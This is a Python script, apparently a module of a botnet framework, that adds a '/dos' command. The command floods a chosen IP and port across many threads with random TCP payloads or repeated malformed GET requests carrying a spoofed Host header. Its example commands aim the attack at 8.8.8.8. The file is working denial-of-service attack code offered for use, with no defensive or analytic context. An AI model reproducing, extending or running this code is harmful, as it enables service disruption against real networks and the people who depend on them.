


import socket
import random
import logging
import threading

from .. import BotNet, Context, UserException
from ..utils import simple_serializer

_logger = logging.getLogger(f"__{__name__}   ")

# TODO: Improve this Script!

@BotNet.default_script(script_version="0.0.1")
def dos(context: Context) -> str:
    """
    Denial-Of-Service Attack.

    syntax:
        `/dos <attack-type{GETFlood,ACKFlood}> <ipv4> <port> <thread-number> <count>`

    example command:
        `/dos GETFlood 8.8.8.8 443 10 1000`
        `/dos ACKFlood 8.8.8.8 443 10 1000` 

    GETFlood: send GET request to target
    ACKFlood: send random data to target
    """
    command, err = simple_serializer(context.command, [str, str, int, int, int])
    if err:
        raise UserException(err)
    
    DOSTYPE = command[0]
    TARGET = command[1]
    PORT = command[2]
    THREAD_NUM = command[3]
    COUNT = command[4]

    try:
        # validate tareget ip
        _logger.debug(f"Checking IP {TARGET} on port {PORT}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET, PORT))
        s.close()
    except:
        _logger.debug(f"Connect to IP {TARGET} on port {PORT} failed, Is the IP correct?")
        raise UserException(f"Connect to IP {TARGET} on port {PORT} failed, Is the IP correct?")

    else:

        try:
            _logger.debug("Starting Dos Attack...")
            dos = Dos(TARGET, PORT, DOSTYPE, COUNT)
            for _ in range(THREAD_NUM):
                thread = threading.Thread(target=dos.attack)
                thread.start()
            return "Starting Dos Attack.."

        except:
            _logger.debug("Something Failed. Maybe The Servers Are Down !")
            return "Something Failed. Maybe The Servers Are Down !"



class Dos:
    def __init__(self, TARGET, PORT, DOSTYPE, COUNT):
        self.TARGET = TARGET
        self.PORT = PORT
        self.DOSTYPE = DOSTYPE
        self.COUNT = COUNT

    def attack(self):
        # ACKFlood
        if self.DOSTYPE == "ACKFlood":
            print(111)
            for _ in range(self.COUNT):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.TARGET, self.PORT))
                s.sendto((random._urandom(random.randint(50,300))), (self.TARGET, self.PORT))
                s.close()
        
        # GETFlood
        else:
            fakeip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
            for _ in range(self.COUNT):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.TARGET, self.PORT))
                s.sendto((f"GET / {self.TARGET} HTTP/1.1\r\n").encode('ascii'), (self.TARGET, self.PORT))
                s.sendto((f"Host: {fakeip}\r\n\r\n").encode('ascii'), (self.TARGET, self.PORT))
                s.close()
